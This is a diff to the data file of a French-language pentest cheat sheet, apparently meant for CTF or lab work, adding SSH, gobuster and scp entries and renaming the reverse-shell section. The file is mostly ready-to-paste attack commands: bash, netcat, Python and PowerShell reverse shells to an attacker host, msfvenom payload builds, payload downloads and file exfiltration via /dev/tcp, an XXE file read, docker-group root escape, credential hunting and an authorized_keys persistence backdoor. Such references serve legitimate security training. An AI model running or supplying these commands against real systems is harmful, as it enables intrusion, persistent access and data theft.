@@ -15,7 +15,7 @@ window.CHEAT_CATS = {
   "2 · Énum. services": "#38bdf8",
   "3 · Énum. web": "#60a5fa",
   "4 · Exploitation web": "#818cf8",
-  "5 · Reverse shell": "#f87171",
+  "5 · Accès & reverse shell": "#f87171",
   "6 · Stabiliser le shell": "#fb7185",
   "7 · Transfert de fichiers": "#a78bfa",
   "8 · Privesc Linux": "#fb923c",
@@ -45,6 +45,7 @@ window.CHEATSHEET = [
   ["2 · Énum. services", "SMB — partages (anonyme)", "smbclient -N -L //{RHOST}/\nnetexec smb {RHOST} -u '' -p '' --shares", "samba nxc"],
   ["2 · Énum. services", "SMB — énumération complète", "enum4linux-ng -A {RHOST}", "users samba"],
   ["2 · Énum. services", "FTP — connexion anonyme", "ftp anonymous@{RHOST}", "ftp 21"],
+  ["2 · Énum. services", "SSH — version et méthodes d'authentification", "nmap -p 22 -sV --script ssh-auth-methods,ssh2-enum-algos {RHOST}", "ssh 22"],
   ["2 · Énum. services", "SNMP — lire les infos", "snmpwalk -v2c -c public {RHOST}", "udp 161"],
   ["2 · Énum. services", "LDAP — infos anonymes", "ldapsearch -x -H ldap://{RHOST} -s base namingcontexts", "ldap ad"],
   ["2 · Énum. services", "NFS — partages exportés", "showmount -e {RHOST}\nsudo mount -t nfs {RHOST}:/partage /mnt", "nfs 2049"],
@@ -56,6 +57,8 @@ window.CHEATSHEET = [
   ["3 · Énum. web", "ffuf — fichiers + extensions", `ffuf -u {URL}/FUZZ -w ${CS_SL}/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak -ic`, "backup"],
   ["3 · Énum. web", "ffuf — sous-domaines (vhosts)", `ffuf -u {URL} -H 'Host: FUZZ.{DOMAIN}' -w ${CS_SL}/Discovery/DNS/subdomains-top1million-5000.txt -ac`, "subdomain"],
   ["3 · Énum. web", "ffuf — paramètres GET", `ffuf -u '{URL}/index.php?FUZZ=test' -w ${CS_SL}/Discovery/Web-Content/burp-parameter-names.txt -ac`, "param"],
+  ["3 · Énum. web", "gobuster — répertoires et fichiers", `gobuster dir -u {URL} -w ${CS_SL}/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50`, "dirbusting"],
+  ["3 · Énum. web", "gobuster — sous-domaines (vhosts)", `gobuster vhost -u {URL} -w ${CS_SL}/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`, "subdomain vhost"],
   ["3 · Énum. web", "git-dumper — dépôt .git exposé", "git-dumper {URL}/.git ./repo", "source leak"],
   ["3 · Énum. web", "wpscan — WordPress", "wpscan --url {URL} -e ap,u", "cms wp"],
 
@@ -71,13 +74,15 @@ window.CHEATSHEET = [
   ["4 · Exploitation web", "XXE — lire un fichier", "<?xml version=\"1.0\"?>\n<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>", "xml"],
   ["4 · Exploitation web", "JWT — cracker le secret", "hashcat -m 16500 jwt.txt {WORDLIST}", "token"],
 
-  // ============ 5 · Reverse shell ============
-  ["5 · Reverse shell", "Écouteur", "rlwrap -cAr nc -lvnp {LPORT}", "listener nc"],
-  ["5 · Reverse shell", "Bash", "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'", "revshell"],
-  ["5 · Reverse shell", "Netcat (mkfifo, sans -e)", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f", "nc"],
-  ["5 · Reverse shell", "Python", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'", "revshell"],
-  ["5 · Reverse shell", "PowerShell", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"", "windows"],
-  ["5 · Reverse shell", "msfvenom — binaire Linux / Windows", "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe", "payload"],
+  // ============ 5 · Accès & reverse shell ============
+  ["5 · Accès & reverse shell", "SSH — se connecter (mot de passe ou clé)", "ssh {USER}@{RHOST}\nchmod 600 id_rsa && ssh -i id_rsa {USER}@{RHOST}", "ssh 22"],
+  ["5 · Accès & reverse shell", "SSH — vieux serveur (algorithmes refusés)", "ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa {USER}@{RHOST}", "ssh rsa legacy"],
+  ["5 · Accès & reverse shell", "Écouteur", "rlwrap -cAr nc -lvnp {LPORT}", "listener nc"],
+  ["5 · Accès & reverse shell", "Bash", "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'", "revshell"],
+  ["5 · Accès & reverse shell", "Netcat (mkfifo, sans -e)", "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f", "nc"],
+  ["5 · Accès & reverse shell", "Python", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'", "revshell"],
+  ["5 · Accès & reverse shell", "PowerShell", "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"", "windows"],
+  ["5 · Accès & reverse shell", "msfvenom — binaire Linux / Windows", "msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe", "payload"],
 
   // ============ 6 · Stabiliser le shell ============
   ["6 · Stabiliser le shell", "TTY complet (python + stty)", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z, puis :\nstty raw -echo; fg\nexport TERM=xterm; stty rows 40 cols 160", "upgrade"],
@@ -88,6 +93,7 @@ window.CHEATSHEET = [
   ["7 · Transfert de fichiers", "Télécharger sur Linux", "wget http://{LHOST}:8000/{FILE} -O /tmp/{FILE}\ncurl http://{LHOST}:8000/{FILE} -o /tmp/{FILE}", "download"],
   ["7 · Transfert de fichiers", "Télécharger sur Windows", "iwr http://{LHOST}:8000/{FILE} -OutFile C:\\Windows\\Temp\\{FILE}\ncertutil -urlcache -f http://{LHOST}:8000/{FILE} {FILE}", "download"],
   ["7 · Transfert de fichiers", "Partage SMB (vers Windows)", "impacket-smbserver share . -smb2support\n# cible : copy \\\\{LHOST}\\share\\{FILE} .", "smb"],
+  ["7 · Transfert de fichiers", "scp — copier via SSH", "scp {FILE} {USER}@{RHOST}:/tmp/          # vers la cible\nscp {USER}@{RHOST}:/chemin/{FILE} .      # depuis la cible", "ssh"],
   ["7 · Transfert de fichiers", "Récupérer un fichier de la cible", "# attaquant :\nnc -lvnp {LPORT} > {FILE}\n# cible :\ncat {FILE} > /dev/tcp/{LHOST}/{LPORT}", "exfil"],
 
   // ============ 8 · Privesc Linux ============
@@ -98,6 +104,7 @@ window.CHEATSHEET = [
   ["8 · Privesc Linux", "Services internes", "ss -tulpn", "ports locaux"],
   ["8 · Privesc Linux", "Chercher des mots de passe", "grep -rniE 'pass(word)?|secret|api_key' /var/www /opt /home 2>/dev/null | head -50", "credentials"],
   ["8 · Privesc Linux", "Groupe docker → root", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh", "docker lxd"],
+  ["8 · Privesc Linux", "SSH — clés privées et persistance", "find / -name id_rsa -o -name id_ed25519 2>/dev/null\n# poser ma clé : ssh-keygen -t ed25519 -f ./key -N ''\necho '<contenu de key.pub>' >> ~/.ssh/authorized_keys", "ssh key"],
 
   // ============ 9 · Privesc Windows ============
   ["9 · Privesc Windows", "WinPEAS — tout vérifier", ".\\winPEASx64.exe", "enum auto"],
